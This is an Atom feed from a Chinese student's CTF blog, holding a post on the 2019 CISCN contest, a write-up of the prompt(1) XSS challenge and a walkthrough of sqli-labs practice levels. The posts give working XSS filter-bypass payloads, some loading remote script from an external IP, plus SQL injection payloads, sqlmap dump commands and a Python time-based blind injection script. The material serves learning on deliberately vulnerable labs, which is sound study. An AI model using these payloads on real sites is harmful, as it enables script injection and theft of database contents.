<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>B1ind&#39;s blog</title>
  
  <subtitle>B1ind</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-08-05T16:02:05.765Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019ciscn总结</title>
    <link href="http://yoursite.com/2019/08/05/2019ciscn%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/08/05/2019ciscn总结/</id>
    <published>2019-08-05T15:16:21.000Z</published>
    <updated>2019-08-05T16:02:05.765Z</updated>
    
    <content type="html"><![CDATA[<p>人生第一次参加国家级的比赛，可以说从报名，到初赛，到分区赛，到决赛，都兴奋又紧张。<br>同时对ctf的认识多了许多，以前总感觉那些群里说话的人都好厉害，感觉自己与别人差很远.<br>经过这次比赛发现，其实自己身边的学长在ctf圈已经是很厉害很厉害了，其他ctfer也没有这么强.<br>接下来要做的是抓紧奋起直追，努力提高，我们现在太缺web手了。</p><a id="more"></a><p>这次总决赛的web题其实挺没用体验感的，虽然说这些选手互相出题不能代表未来ctf的走向，但是还是暴露了自己的不足.<br>第一天都是<strong>web与AI，JAVA，逆向，pwn的结合</strong>，没有纯php的web，所以我们根本无从下手。<br>第二天才出现一道纯php,然后这个题挺简单的，一个cookie伪造，然后用文件名写马。不得不说，独立解题的感觉很好。</p><p>总之我的体会就是两点:<br>1、web的方向一直在变，大家都在疯狂结合各自知识点，我不能再做一个纯web手了，而是要做一个web安全工程师，也就是简单的逆向，pwn，java，AI这些知识都需要稍微会一点<br>2、还是要提升手速，手速太慢了，<strong>而且太多的东西都没有实践，感觉看懂了就行了，但是实际做起来会很费劲</strong>，比如写一个覆盖文件的shell脚本都花了很久，还出错了，tar打包，端口转发，都相当不熟练。</p><p>收获到的知识点：</p><ul><li>ssti可以通过 获取对方的秘钥，然后flask模块由于是客户端ssession,所以可以伪造ssesion</li><li>&lt;?php  可以用短标签 &lt;?=  与  &lt;?  代替</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;人生第一次参加国家级的比赛，可以说从报名，到初赛，到分区赛，到决赛，都兴奋又紧张。&lt;br&gt;同时对ctf的认识多了许多，以前总感觉那些群里说话的人都好厉害，感觉自己与别人差很远.&lt;br&gt;经过这次比赛发现，其实自己身边的学长在ctf圈已经是很厉害很厉害了，其他ctfer也没有这么强.&lt;br&gt;接下来要做的是抓紧奋起直追，努力提高，我们现在太缺web手了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="-ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>prompt(1)</title>
    <link href="http://yoursite.com/2019/05/23/prompt-1/"/>
    <id>http://yoursite.com/2019/05/23/prompt-1/</id>
    <published>2019-05-23T12:28:42.000Z</published>
    <updated>2019-05-23T12:51:55.356Z</updated>
    
    <content type="html"><![CDATA[<p>这个是我学习xss的平台  要求实现js语句prompt(1)<br>讲道理，我觉得这个挺难的，基本上我当时全是看wp<br>现在也不一定能做出来，考了很多HTML的冷门知识，还有一些很麻烦的编码<br>现在去看自己写的wp，有的也是像新知识。。<br>还是有时间会将其转为他人可读版本</p><a id="more"></a><ol start="0"><li><p>没有任何的过滤  只要闭合”&gt;就OK了<br>payload:<br><strong><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;&quot;</code></strong></p></li><li><p>这一题我居然就不会了<br>题目的过滤正则表达式  /&lt;\/?[^&gt;]+&gt;/gi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">？：表示匹配前面的子表达式(/)零次或一次</span><br><span class="line">[^&gt;]：为负值字符集合，匹配未包含 &gt; 的任意字符</span><br><span class="line">+：表示匹配前面的子表达式一次或多次</span><br></pre></td></tr></table></figure></li></ol><p>意思就是不能有&lt;内容&gt;这种格式存在<br>我开始完全没头绪  后来才知道  浏览器可以自动补全尖括号<br>所以payload:<br><strong><code>&lt;img src=# on error=&quot;prompt(1)&quot;</code></strong>       </p><p>以下的也行：<br><strong><code>&lt;svg/onload=prompt(1)//</code></strong><br><strong><code>&lt;body/onload=prompt(1)//</code></strong></p><p>2、这个题目又不会做  刚刚看完编码  先html编码   再url编码  再js的编码<br>这个问题过滤语句<br><code>input = input.replace(/[=(]/g, &#39;&#39;);</code><br>它过滤了=与(<br>这时我首先想到HTML实体编码   但是  HTML没有  (  的实体编码  这个咋办<br>wp:<br>页面遇到 javascript 代码时阻塞 html 的解析，先执行 js 代码（也就是上面的 escape function）。此时输入中的 xml 实体未被解析，从而绕过过滤，并将输入 return 到 html 文档中，继续解析 html。<br>当遇到 svg 标签，先将其标签的内容当成 xml 解析，此时解析输入中的实体。<br>当 html 再次进行解析时，会把已被解析的实体当成 html 代码执行。</p><p>所以我们采用<svg>标签   然后把后面的  (  XML编码掉<br/>payload:<br/><strong><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;</code></strong><br/>还有使用eval函数的   但是看不懂啊啊啊<br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br/></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval.call`$&#123;&apos;prompt\x281)&apos;&#125;`&lt;/script&gt;</span><br/></pre></td></tr></table></figure></svg></p><p>以下代码也行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#28;1)&lt;/script&gt;/*可以成功弹窗*/</span><br><span class="line">&lt;script&gt;alert&amp;#28;1)&lt;/script&gt;/*不能弹窗*/</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert\u0028;1)&lt;/script&gt;/*不能成功弹窗*/</span><br></pre></td></tr></table></figure><p>为什么呢？</p><p>这是由于解析模式不同造成的。svg继承于XML而不是HTML，其解析的方式与script标签解析的方式是不同的，简单来说script属于Raw text elements,其解析规则：<br><code>&lt;</code>,<code>&amp;#x28</code>,\u0028等不会解析为实体字符<code>&lt;</code>,<code>(</code><br>而svg标签只有两种解析方式：<br>正常情况下，实体会被转义，如<code>&amp;lt</code>;被转义为&lt;，<code>&amp;#x28</code>; 被转义为(; &lt; ![CDATA[和]]&gt;包含的实体则不转义<br>具体可以看<br><a href="https://segmentfault.com/q/1010000002391106" target="_blank" rel="noopener">链接</a><br>所以这道题答案可以用<code>&amp;#x28</code>绕过（</p><ol start="3"><li><p>它让你输入的文字出现在注释里  而且还把-&gt;过滤掉了<br>没有办法   我不会  wp说<br>将输入转化成注释，并过滤了-&gt;防止闭合注释。但使用–!&gt;也可以闭合注释，并且绕过过滤<br>payload:     <strong><code>--!&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</code></strong></p></li><li><p>这个题目真是把我吓一跳   首先  我真不知道我javascript学到是什么屎   太菜了  读不懂源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input)))</span><br></pre></td></tr></table></figure><p>这一句很关键<br>也就是需要满足input里面可以匹配到 (https可有可无)     //prompt.ml/   这个东西<br>这个就相当于一个网页呗  可是这样  我的js代码怎么进去呢<br>这时    我才知道  url的完整形式<br><strong><code>scheme://login:password@address:port/path/to/resource?query_string#fragment。</code></strong><br>这个用来绕ssrf也很有用的</p></li></ol><p>太可怕了  我现在才知道  。。。。<br>由于正则前面有//所以必须把正则语句放前面  既然这样  我们把prompt.ml/当成login:password算了<br>反正我们要构建自己的网站去执行js代码  可是后面的   /   怎么办呢  这个可是会影响@的使用的<br>于是decodeURIComponent()就派上用处了   我们有%2f来代替 / 就OK了<br>所以我们构造的payload :    <strong><code>//prompt.ml%2f@39.96.23.228/1.js</code></strong><br>其中js的内容就是prompt(1) 没有<script>这种标签</p><p>5、过滤语句<br><strong><code>input = input.replace(/&gt;|on.+?=|focus/gi, &#39;_&#39;);</code></strong><br>然后我们的input会挂在<br><strong><code>return &#39;&lt;input value=&quot;&#39; + input + &#39;&quot; type=&quot;text&quot;&gt;&#39;;</code></strong><br>中,好可惜  我觉得我应该可以做出来的  就是没看懂那个问号  问号其实是非贪婪模式<br>也是说  只要on开始的单词哪一行不要跟等于就好了  由于.不能匹配换行符 我们可以用换行符阻拦<br>那让我们不禁想起  onerror  但是这个一般都是在图片情况下   并且一般是<br><code>&lt;img  src=# on error=xxxx&gt;</code><br>但是我才知道   <strong><code>input框里可以指定type=&quot;image&quot;</code></strong><br>所以我们payload为：<br><strong><code>&quot; type=&quot;image&quot;  src=#  onerror=prompt(1)</code></strong></p><ol start="6"><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // let&apos;s do a post redirection</span><br><span class="line">    try &#123;</span><br><span class="line">        // pass in formURL#formDataJSON</span><br><span class="line">        // e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br><span class="line">        var segments = input.split(&apos;#&apos;);</span><br><span class="line">        var formURL = segments[0];</span><br><span class="line">        var formData = JSON.parse(segments[1]);</span><br><span class="line"></span><br><span class="line">        var form = document.createElement(&apos;form&apos;);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = &apos;post&apos;;</span><br><span class="line"></span><br><span class="line">        for (var i in formData) &#123;</span><br><span class="line">            var input = form.appendChild(document.createElement(&apos;input&apos;));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(&apos;value&apos;, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return form.outerHTML + &apos;                         \n\</span><br><span class="line">&lt;script&gt;                                                  \n\</span><br><span class="line">    // forbid javascript: or vbscript: and data: stuff    \n\</span><br><span class="line">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span><br><span class="line">        document.forms[0].submit();                       \n\</span><br><span class="line">    else                                                  \n\</span><br><span class="line">        document.write(&quot;Action forbidden.&quot;)               \n\</span><br><span class="line">&lt;/script&gt;                                                 \n\</span><br><span class="line">        &apos;;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        return &apos;Invalid form data.&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>愈发感觉这尼玛是代码审计题目啊啊啊啊啊啊<br>这个题我主要蒙在json格式上  我还以为json是牛逼的东西  结果。。。。<br>{键:值}就是json<br>真是有毒  这个题的格式是  a#b   其中a会放入action参数中   b会被json解析  然后作为属性与值加入input标签中。<br>但是后面有一个正则过滤  会过滤掉JavaScript：伪协议<br>但是仔细看过滤目标  document.forms[0].action<br>只要存在子级tag, action 将会优先指向name为action的子tag<br>我们只要让这个标签有两个action标签就可以绕过过滤<br>所以payload：<br><strong><code>javascript:prompt(1)#{&quot;action&quot;:1}</code></strong><br>天啊  得赶紧好好学javascript代码审计了</p><ol start="6"><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var segments = input.split(&apos;#&apos;);</span><br><span class="line">    return segments.map(function(title) &#123;</span><br><span class="line">        // title can only contain 12 characters</span><br><span class="line">        return &apos;&lt;p class=&quot;comment&quot; title=&quot;&apos; + title.slice(0, 12) + &apos;&quot;&gt;&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;).join(&apos;\n&apos;);</span><br></pre></td></tr></table></figure></li></ol><p>这个·代码使得我们#分割的payload长度不长于12<br>payload:<br><strong><code>&quot;&gt;&lt;script&gt;/*#*/prompt(/*#*/1)/*#*/&lt;/script&gt;</code></strong><br>真的惊艳到我了  tql  居然还可以用注释符来绕过字符长度限制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;*/prompt(/*&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;*/1)/*&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;*/&lt;/script&gt; &quot;&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure></p><p>运用注释符可以跨行实现注释   所以  使用注释让真正的代码只剩下我们想要的代码<br>自己体会吧   好好学html</p><ol start="8"><li>这题无法复现<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // prevent input from getting out of comment</span><br><span class="line">    // strip off line-breaks and stuff</span><br><span class="line">    input = input.replace(/[\r\n&lt;/&quot;]/g, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    return &apos;                                \n\</span><br><span class="line">&lt;script&gt;                                    \n\</span><br><span class="line">    // console.log(&quot;&apos; + input + &apos;&quot;);        \n\</span><br><span class="line">&lt;/script&gt; &apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>这个可以看出来要闭合log(“才行  但是”  &lt; 换行  缩进  全没了  这个有点难受 </p><ol start="9"><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // filter potential start-tags</span><br><span class="line">    input = input.replace(/&lt;([a-zA-Z])/g, &apos;&lt;_$1&apos;);</span><br><span class="line">    // use all-caps for heading</span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span><br><span class="line">    return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>题目在此<br>这个题主要是把&lt;后面直接接的第一个字母改成_  我当时想的是换行或者空格  但是发现没有 浏览器不识别空格开头的标签<br>wp是真的牛批<br>经过查资料发现这里的关键在于toUpperCase()不仅转换英文字母，也转换一些Unicode字符，比如将ſ传入就可以转换为S，这样就可以绕过。<br>直接构造&lt;ſcript&gt;prompt(1)&lt;/ſcript&gt;不行，因为javascript对大小写敏感,，不识别PROMPT(1)<br>所以构造的payload为&lt;ſcript ſrc=”<a href="http://39.96.23.228/1.js&quot;&gt;">http://39.96.23.228/1.js&quot;&gt;</a>&lt;/ſcript&gt;，经过转换后就成了<h1><SCRIPT SRC="HTTP://39.96.23.228/1.JS"></script>，成功加载远程的js脚本。<br>注意  远程脚本名字是1.JS  而不是1.js  注意linux分大小写</p><p>A. 这居然是个简单题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // (╯°□°）╯︵ ┻━┻</span><br><span class="line">    input = encodeURIComponent(input).replace(/prompt/g, &apos;alert&apos;);</span><br><span class="line">    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span><br><span class="line">    input = input.replace(/&apos;/g, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span><br><span class="line">    return &apos;&lt;script&gt;&apos; + input + &apos;&lt;/script&gt; &apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>encodeURIComponent()不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ‘ ( )</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">简单来说，escape是对字符串(string)进行编码(而另外两种是对URL)，作用是让它们在所有电脑上可读。</span><br><span class="line">编码之后的效果是%XX或者%uXXXX这种形式。其中 ASCII字母、数字、@*/+ ，这几个字符不会被编码，其余的都会。</span><br><span class="line">最关键的是，当你需要对URL编码时，请忘记这个方法，这个方法是针对字符串使用的，不适用于URL。</span><br><span class="line"></span><br><span class="line">encodeURI方法不会对下列字符编码  ASCII字母、数字、~!@#$&amp;*()=:/,;?+&apos;</span><br><span class="line">encodeURIComponent方法不会对下列字符编码 ASCII字母、数字、~!*()&apos;</span><br></pre></td></tr></table></figure><hr><p>还没做完，找个时间我把它做完</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个是我学习xss的平台  要求实现js语句prompt(1)&lt;br&gt;讲道理，我觉得这个挺难的，基本上我当时全是看wp&lt;br&gt;现在也不一定能做出来，考了很多HTML的冷门知识，还有一些很麻烦的编码&lt;br&gt;现在去看自己写的wp，有的也是像新知识。。&lt;br&gt;还是有时间会将其转为他人可读版本&lt;/p&gt;
    
    </summary>
    
    
      <category term="-刷题记录" scheme="http://yoursite.com/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>sqli</title>
    <link href="http://yoursite.com/2019/05/23/sqli/"/>
    <id>http://yoursite.com/2019/05/23/sqli/</id>
    <published>2019-05-23T06:59:33.000Z</published>
    <updated>2019-05-23T07:37:23.955Z</updated>
    
    <content type="html"><![CDATA[<p>当初刷sqli的记录了，同样的随心所欲，我也不知道为啥，总是不喜欢打标点符号，感觉空格更舒服<br>其实说真的，刷完sqli才感觉自己web安全入门了，真正的感受到了一些漏洞点的存在<br>也找到了一点自信，感觉自己是一名真正的脚本小子了。。。<br>还是得脚踏实地，枯燥系统的刷题，才能更好的理解这些漏洞点的存在，嗯，就是这样。</p><a id="more"></a><ol><li><p>第1题<br>一看有回显  而且输入id=1’会报错，果断联合查询  居然没有任何过滤。。但是注意一点  联合查询的时候<br><strong><code>?id=&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23</code></strong><br>括号内的select不能删 。。。。<br><strong>然后补充几点新知识注释： –+      –%20     %23(#的编码)常见注释 %20 -&gt; （空格）%22 -&gt; “%23 -&gt; #%25 -&gt; %%27 -&gt; ‘</strong></p></li><li><p>第2题<br>同T1</p></li><li><p>第3题<br>看回显<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code><br>这可还行  显然要闭合（ 了 ，闭合完之后就是正常操作了 <strong>发现一个新东西 group_concat(username,’—-‘,password) from users)居然是键值对的形式返回的 Dumb—-Dumb,Angelina—-I-kill-you,Dummy----p@ssword……..</strong></p></li><li><p>第4题<br>‘不报错  ”报错  而且还爆出（）  于是一眼看出这是用”闭合。然后又是一顿联合注入</p></li><li><p>第5题<br>由于它只有一个回显说 you are in…  说明它只能bool注入  或者时间盲注了sqlmap一跑  就OK  </p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-5/?id=1&quot; --dbs</span><br><span class="line"> python2 sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-5/?id=1&quot; -D security --tables</span><br><span class="line"> python2 sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-5/?id=1&quot; -D security -T users --columns</span><br><span class="line"> python2 sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-5/?id=1&quot; -D security -T users -C password --dump</span><br></pre></td></tr></table></figure><p> 后来发现   这个其实是报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;union select count(*),1, concat(&apos;~&apos;,(select database()),&apos;~&apos;,floor(rand(14)*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure></p><p>详情看笔记mysql报错注入原 理分析</p><ol start="6"><li><p>第6题<br>用”闭合的bool注入 因为在id=1后加上’不报错  加上”报错  说明这个是”闭合 我们只需要在sqlmap上加入–level  3   这个参数即可  这个参数可以自动检验”的闭合情况这其实是”双引号闭合的报错注入</p></li><li><p>第7题<br>这个题目说了用outfile导出文件     这里有一篇巨好的文章<a href="https://www.jianshu.com/p/7b9256de20d1这个首先闭合就是由一定的坑" target="_blank" rel="noopener">https://www.jianshu.com/p/7b9256de20d1这个首先闭合就是由一定的坑</a>  首先  ?id=1    ?id=1’   ?id=1”发现只有单引号报错   于是一定要用单引号闭合   但是?id=1’ –+ 还是报错我认为  有两种可能<br>1、闭合不到位<br>2、注释符号被过滤<br>事实证明  是闭合不到位  我们疯狂加))来闭合   发现?id=1’))–+不报错好了  闭合完成接下来开始写<br><strong><code>?id=1&#39;)) union select * from users into outfile &quot;D:\\1.txt&quot;--+</code></strong><br>发现写不进去    两个原因1. 第1题<br>在执行sql语句的用户权限不够<br><strong><strong><code>?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code></strong></strong><br>这个重要发现不报错  忽略这个原因<br>2、那么就是 secure_file_priv 这个东东的问题了</p></li><li><p>第8题<br>这就是bool盲注  没得讲</p></li><li><p>第9题<br>这个用’  “ 闭合都不报错  然后?id=1’ and sleep(2)–+ 发现会延时  所以就是 时间盲注 and if((length(database())&gt;5),sleep(5),0)但是果断还是sqlmap来跑</p></li><li><p>第10题<br>基于双引号闭合的时间盲注</p></li><li><p>第11题<br>基于post注入的联合查询注入把  反正我联合查询查出来了<br><strong><code>uname=1&#39; union select (select group_concat(column_name) from information_schema.columns where table_name = &quot;users&quot;),3%23&amp;passwd=1&amp;submit=Submit</code></strong><br>好了  报错注入也可以<br><strong><code>uname=1&#39; union select count(*),concat(database(),&#39;~&#39;,floor(rand(14)*2))a from information_schema.tables group by a%23 &amp;passwd=1&amp;submit=Submit</code></strong></p></li><li><p>第12题<br>与上题一样   但是闭合需要用   “)   然后联合或者报错了</p></li><li><p>第13题<br>这个题的特点是它只会告诉你是登陆成功与sql查询报的错误   所以用 ‘)闭合之后一顿报错 ，当然  我猜它bool注入也没有问题</p></li><li><p>第14题<br>先套出来它是双引号闭合  然后发现它还是能报错注入。。。。。</p></li><li><p>第15题<br>这个题不能报错注入  但是它至少会告诉你登陆成功还是失败  所以可以bool注入<br><strong><code>uname=1&#39; or 1=1%23&amp;passwd=1&amp;submit=Submit</code></strong><br>sqlmap是真的用不习惯，这里奉上脚本    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests,datetime</span><br><span class="line">url = &quot;http://127.0.0.1/sqli/Less-15/&quot;</span><br><span class="line">char = &quot;abcdefghijklmnopqrstuvwxyz_&quot;</span><br><span class="line">for i in range(0,10):</span><br><span class="line">    database = &quot;&quot;</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        for str in char:</span><br><span class="line">            # print(str)</span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            data = &#123;&apos;uname&apos;:&quot;admin&apos;and If((mid((select schema_name from information_schema.schemata limit %d,1),%d,1))=&apos;%s&apos;,1,sleep(2))#&quot;%(i,j,str),&apos;passwd&apos;:&quot;1&quot;&#125;</span><br><span class="line">            res = requests.post(url,data=data)</span><br><span class="line">            # print(res.text)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            if sec&lt;=1:</span><br><span class="line">                database += str</span><br><span class="line">                print(database)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;the %d database: &quot;%i)</span><br><span class="line">    print(database)</span><br></pre></td></tr></table></figure></li><li><p>第16题<br>双引号闭合的bool注入   上述脚本改改就OK了</p></li><li><p>第17题<br>这个题提示是update ，确实不会  我感觉其实有可能会 但是就是出错  包括用别人的payload都会报错  真是怪了这个题目坑就坑在：<br>1、 uname被过滤处理了  基本无法注入<br>2、 而password在update语句中，所以不能union select<br>然后才知道  除了联合查询  其实还可以or语句    像update   delete  insert  都是用 or语句连接查询语句这个注入还挺复杂   简书上有篇文章介绍的很详细很详细</p></li><li><p>pass</p></li><li><p>pass</p></li><li><p>pass</p></li><li><p>第21题<br>中间有几个题目发现按照wp来也实现不了  先跳过这题提示是cookies注入   首先账号密码被我套admin与1给套进去了   然后弹出的界 面有cookie值  cookie值有uname 这一选项  后面是一套base64编码的值 就是admin的base64编码  猜测后台根据cookie中的值查询数据库  再与提交的password进行比对 于是我们可以直接在cookie中的uname上面进行注入   当然  需要base64编码。联合查询的payload：  <strong><code>MScpIHVuaW9uIHNlbGVjdCAoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSwnLS0nLHBhc3N3b3JkKSBmcm9tIHVzZXJzKSwxLDEj</code></strong><br>还可以报错注入：<strong><code>MScpIHVuaW9uIHNlbGVjdCBjb3VudCgqKSwxLCBjb25jYXQoJ34nLChzZWxlY3QgZGF0YWJhc2UoKSksJ34nLGZsb29yKHJhbmQoMTQpKjIpKWEgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGdyb3VwIGJ5IGEj</code></strong></p></li><li><p>第22题<br>只是把单引号换成双引号payload：        YWRtaW4iIHVuaW9uIHNlbGVjdCAzLGRhdGFiYXNlKCksNCBsaW1pdCAxLDIj</p></li><li><p>第23题<br>这个题目回到了get注入  很爽    根据报错可以知道  注释符号被过滤了 我当时看到 mysql_fetch_array() 我还以为有空字节截断漏 洞  后来知道我记错了  要用最简单的 or 1=’1 去闭合后一个单引号我基本做出来了  就是有一个问题   它后面有一个limit 0,1 我们联合查询的结果无法显示出来  这一点把我弄懵逼了  事实上  方法很简单              直接把id=1改成一个错误的id=10000就行</p></li><li><p>第24题<br>讲道理  这题完全不会  因为没有头绪  这个题设计得很好  有登陆  改密码  注册界面              首先要结合代码审计 判断出来 只有注册界面的username没有被过滤  而且完全没有被过滤  其余全被过滤了  很不好注入            新姿势  二次注入 ：首先把设 计好的代码放到数据库中存好  然后在通过其他手段触发它比如这一题  我们首先通过注册没有过滤这一弱点  将我们想存的东西存进去  我们准备在修改密码的时候进行攻击  于是我们注册一个 用户名为admin’– 的用户（密码随意）然后在修改密码的界面对它进行修改这时候修改的其实是admin用户的密码   然后你就可以用修改后的密码去登陆admin账户了</p></li><li><p>第25题<br>这个题刚开始还吓我一跳  经过测试  发现只是or  与 and  被过滤了而已  注释符都没有被过滤  这个就直接联合查询注入就行?id=1’ union select 1,database(),3 limit 1,2%23突然发现还可以anandd  oorr这样绕过   小意思wp说还可以&amp;&amp;  || 绕过……</p></li></ol><p>25a、这题更加简单  但是加’  或 “ 都报错  于是这是整数型注入   我还以为是什么很难的东西   结果就是不需要闭合而已  天啊 浪费我心情  不用闭合  与上题一样。</p><ol start="26"><li>第26题<br>这个题把注释符与空格给过滤了  而且还不是一次性过滤  不能用2个空格给绕过  于是首先想到/**/代替空格  但是没有想到这个东西 也被过滤了   还试了试括号来代替空格  但是还是有一些问题 没办法  看wp吧   有3条思路 ：  第一种需要在linux上实现   就是使 用特殊的URL编码来代替空格</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* %09 TAB 键（水平）</span><br><span class="line">       * %0a 新建一行</span><br><span class="line">       * %0b TAB 键（垂直）</span><br><span class="line">       * %0c 新的一页</span><br><span class="line">       * %0d return 功能</span><br><span class="line">       * %a0 空格</span><br></pre></td></tr></table></figure><p>这些url特殊编码可以拿来绕过 但是windows下不支持第二种很厉害：充分运用括号与||来代替空格  使用updataxml函数进行报错注入  这个主要是可以直接用||执行函数 